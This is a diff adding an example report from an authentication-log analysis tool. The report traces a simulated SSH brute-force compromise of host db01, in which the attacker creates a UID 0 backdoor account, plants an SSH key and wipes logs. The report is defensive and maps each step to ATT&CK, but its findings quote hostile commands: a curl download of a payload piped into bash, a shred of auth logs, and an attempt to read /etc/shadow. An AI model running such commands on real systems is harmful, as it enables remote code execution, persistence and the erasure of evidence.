@@ -1,0 +1,107 @@
+----------------------------------------------------------------------------
+authtrail  02_bruteforce_compromise.log
+ COMPROMISE LIKELY   12 findings (5 critical, 2 high, 5 medium)
+203.0.113.45 made 120 failed logins against 5 accounts, then logged in as
+'admin' at 03:14. Within 14 min the session opened a root shell, created UID
+0 account 'sysadm', added 'sysadm' to the 'sudo' group, changed the password
+for 'sysadm', piped a download into a shell, planted an SSH key, changed a
+cron job and wiped logs.
+----------------------------------------------------------------------------
+Hosts db01  |  2026-10-28 01:00 -> 2026-10-28 12:00
+277 lines, 182 security events  |  138 failed / 4 successful SSH logins  |  8 sudo commands
+Failed logins per 5 min from 02:55: =@@+                     = peak 41
+----------------------------------------------------------------------------
+ INCIDENT #1   db01: 'admin' from 203.0.113.45  03:14:11 -> 03:29:10 (session closed)
+  03:14:11  CRITICAL Login as 'admin' after 120 failed attempts from 203.0.113.45
+  03:15:20  MEDIUM   Interactive root shell (sudo by 'admin')
+  03:16:41  CRITICAL Second root account 'sysadm' created (UID 0)
+  03:17:05  CRITICAL 'sysadm' added to privileged group 'sudo'
+  03:17:30  MEDIUM   Password changed for 'sysadm'
+  03:19:12  CRITICAL Download piped into a shell (sudo by 'admin')
+  03:21:40  HIGH     SSH authorized_keys accessed (sudo by 'admin')
+  03:24:03  HIGH     Cron job changed (sudo by 'admin')
+  03:27:55  CRITICAL Logs or shell history wiped (sudo by 'admin')
+----------------------------------------------------------------------------
+FINDINGS
+[CRITICAL] Login as 'admin' after 120 failed attempts from 203.0.113.45
+    203.0.113.45 failed 120 times against 5 accounts in the preceding 16
+    min, then logged in as 'admin' with a password: the password for
+    this account was guessed. Treat the account as compromised: reset
+    its password, review what the session did, and block the address.
+    2026-10-28 03:14:11  |  db01  |  ATT&CK T1110.001 Brute Force: Password Guessing, T1078 Valid Accounts, T1021.004 Remote Services: SSH
+    evidence: 02_bruteforce_compromise.log:182, 02_bruteforce_compromise.log:185, 02_bruteforce_compromise.log:188, 02_bruteforce_compromise.log:190, 02_bruteforce_compromise.log:191
+[CRITICAL] Second root account 'sysadm' created (UID 0)
+    During incident #1 (login as 'admin' from 203.0.113.45). 'sysadm'
+    was created with UID 0, home /root and shell /bin/bash. Any UID 0
+    account is root under another name, a classic backdoor that survives
+    a password reset of the real root.
+    2026-10-28 03:16:41  |  db01  |  ATT&CK T1136.001 Create Account: Local Account, T1078.003 Valid Accounts: Local Accounts
+    evidence: 02_bruteforce_compromise.log:197
+[CRITICAL] 'sysadm' added to privileged group 'sudo' (raised from high)
+    During incident #1 (login as 'admin' from 203.0.113.45). Members of
+    'sudo' can become root. Confirm the change was approved.
+    2026-10-28 03:17:05  |  db01  |  ATT&CK T1098 Account Manipulation
+    evidence: 02_bruteforce_compromise.log:198
+[CRITICAL] Download piped into a shell (sudo by 'admin') (raised from high)
+    During incident #1 (login as 'admin' from 203.0.113.45). Ran as root
+    from /home/admin: /usr/bin/bash -c curl -fsSL
+    http://198.51.100.77/payload.sh | bash
+    2026-10-28 03:19:12  |  db01  |  ATT&CK T1105 Ingress Tool Transfer, T1059.004 Command and Scripting Interpreter: Unix Shell
+    evidence: 02_bruteforce_compromise.log:201
+[CRITICAL] Logs or shell history wiped (sudo by 'admin') (raised from high)
+    During incident #1 (login as 'admin' from 203.0.113.45). Ran as root
+    from /home/admin: /usr/bin/shred -u /var/log/auth.log.1
+    2026-10-28 03:27:55  |  db01  |  ATT&CK T1070.002 Indicator Removal: Clear Linux or Mac System Logs, T1070.003 Indicator Removal: Clear Command History
+    evidence: 02_bruteforce_compromise.log:204
+[HIGH] SSH authorized_keys accessed (sudo by 'admin') (raised from medium)
+    During incident #1 (login as 'admin' from 203.0.113.45). Ran as root
+    from /home/admin: /usr/bin/tee -a /root/.ssh/authorized_keys
+    2026-10-28 03:21:40  |  db01  |  ATT&CK T1098.004 Account Manipulation: SSH Authorized Keys
+    evidence: 02_bruteforce_compromise.log:202
+[HIGH] Cron job changed (sudo by 'admin') (raised from medium)
+    During incident #1 (login as 'admin' from 203.0.113.45). Ran as root
+    from /home/admin: /usr/bin/crontab -u root /tmp/.c
+    2026-10-28 03:24:03  |  db01  |  ATT&CK T1053.003 Scheduled Task/Job: Cron
+    evidence: 02_bruteforce_compromise.log:203
+[MEDIUM] SSH brute force from 203.0.113.45
+    84 failed logins in 10 min (external address), mostly against
+    'admin' (24), 'postgres' (23), 'root' (18). Internet-facing SSH sees
+    this constantly, so on its own it is noise; what matters is whether
+    a login from this address follows.
+    2026-10-28 02:58:13  |  db01  |  ATT&CK T1110.001 Brute Force: Password Guessing
+    evidence: 02_bruteforce_compromise.log:15, 02_bruteforce_compromise.log:17, 02_bruteforce_compromise.log:18, 02_bruteforce_compromise.log:21, 02_bruteforce_compromise.log:22, 02_bruteforce_compromise.log:24, 02_bruteforce_compromise.log:25, 02_bruteforce_compromise.log:27
+[MEDIUM] Interactive root shell (sudo by 'admin') (raised from low)
+    During incident #1 (login as 'admin' from 203.0.113.45). Ran as root
+    from /home/admin: /bin/bash
+    2026-10-28 03:15:20  |  db01  |  ATT&CK T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+    evidence: 02_bruteforce_compromise.log:195
+[MEDIUM] Password changed for 'sysadm' (raised from low)
+    During incident #1 (login as 'admin' from 203.0.113.45). Routine
+    unless it happened during an incident.
+    2026-10-28 03:17:30  |  db01  |  ATT&CK T1098 Account Manipulation
+    evidence: 02_bruteforce_compromise.log:200
+[MEDIUM] SSH brute force from 198.51.100.12
+    18 failed logins in 2 min (external address), mostly against 'root'
+    (18). Internet-facing SSH sees this constantly, so on its own it is
+    noise; what matters is whether a login from this address follows.
+    2026-10-28 05:02:00  |  db01  |  ATT&CK T1110.001 Brute Force: Password Guessing
+    evidence: 02_bruteforce_compromise.log:208, 02_bruteforce_compromise.log:209, 02_bruteforce_compromise.log:211, 02_bruteforce_compromise.log:212, 02_bruteforce_compromise.log:214, 02_bruteforce_compromise.log:215, 02_bruteforce_compromise.log:217, 02_bruteforce_compromise.log:218
+[MEDIUM] 'bob' refused by sudo 3 times
+    'bob' is not allowed to run these as root: /bin/bash; /usr/bin/cat
+    /etc/shadow. Probing for privileges is typical right after an
+    account is taken over.
+    2026-10-28 11:43:00  |  db01  |  ATT&CK T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+    evidence: 02_bruteforce_compromise.log:249, 02_bruteforce_compromise.log:250, 02_bruteforce_compromise.log:251
+----------------------------------------------------------------------------
+ATTACK SOURCES
+  address                    pattern         fails accts  logged in as
+  203.0.113.45               brute force       120     5  admin
+  198.51.100.12              brute force        18     1  -
+----------------------------------------------------------------------------
+INDICATORS (defanged)
+  ips       203[.]0[.]113[.]45, 198[.]51[.]100[.]12
+  accounts  sysadm
+  urls      hxxp://198[.]51[.]100[.]77/payload[.]sh
+----------------------------------------------------------------------------
+JSON written to docs/example-output.json
+HTML report written to docs/example-report.html
